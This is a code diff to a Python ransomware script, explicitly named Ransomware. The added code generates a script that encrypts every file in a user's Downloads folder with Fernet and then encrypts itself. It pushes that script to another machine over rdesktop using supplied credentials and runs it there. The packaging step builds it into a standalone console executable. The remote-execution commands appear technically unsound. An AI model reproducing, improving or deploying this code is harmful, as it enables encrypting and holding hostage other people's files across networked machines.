@@ -13,7 +13,6 @@ def write_key():
 def load_key():
     return open("key.key", "rb").read()
 
-
 class Ransomware:
     def __init__(self):
         self.sysRoot = os.path.expanduser('~')
@@ -23,24 +22,49 @@ class Ransomware:
 
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
     def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
-        rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
-        subprocess.Popen(rdp_command, shell=True)
+        # Create the script file content for the target VM
+        script_content = f'''
+import os
+from cryptography.fernet import Fernet
 
+def encrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        data = file.read()
     
-    def encrypt_folder(self, folder_path):
-        for root, dirs, files in os.walk(folder_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                with open(file_path, 'rb') as f:
-                    data = f.read()
+    fernet = Fernet(key)
+    encrypted_data = fernet.encrypt(data)
+    
+    with open(file_path, 'wb') as file:
+        file.write(encrypted_data)
 
-                fernet = Fernet(self.key)
-                encrypted = fernet.encrypt(data)
+downloads_folder_path = os.path.join(os.path.expanduser('~'), "Downloads")
 
-                with open(file_path, 'wb') as f:
-                    f.write(encrypted)
+for root, dirs, files in os.walk(downloads_folder_path):
+    for file in files:
+        file_path = os.path.join(root, file)
+        encrypt_file(file_path, {self.key!r})
 
-        print("Encryption completed.")
+# Encrypt the script file itself
+script_path = os.path.abspath(__file__)
+encrypt_file(script_path, {self.key!r})
+'''
+
+        # Generate a random script name
+        script_name = "encrypt_script.py"
+        script_path = os.path.join(os.getcwd(), script_name)
+        
+        # Write the script file locally
+        with open(script_path, 'w') as script_file:
+            script_file.write(script_content)
+        
+        # Copy the script file to the target VM using RDP (rdesktop)
+        copy_script_command = f'echo {script_path} | rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" {target_vm_ip}'
+        subprocess.Popen(copy_script_command, shell=True)
+
+        # Run the script on the target VM using RDP (rdesktop)
+        run_script_command = f'rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" -s "python3 /home/{rdp_username}/{script_name}" {target_vm_ip}'
+        subprocess.Popen(run_script_command, shell=True)
+
     
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
@@ -92,6 +116,6 @@ setup(
             'compressed': True
         }
     },
-    console=['your_script_name.py'],  # Replace with the actual name of your script file
+    console=['Ransome(RDP).py'], 
     zipfile=None
 )
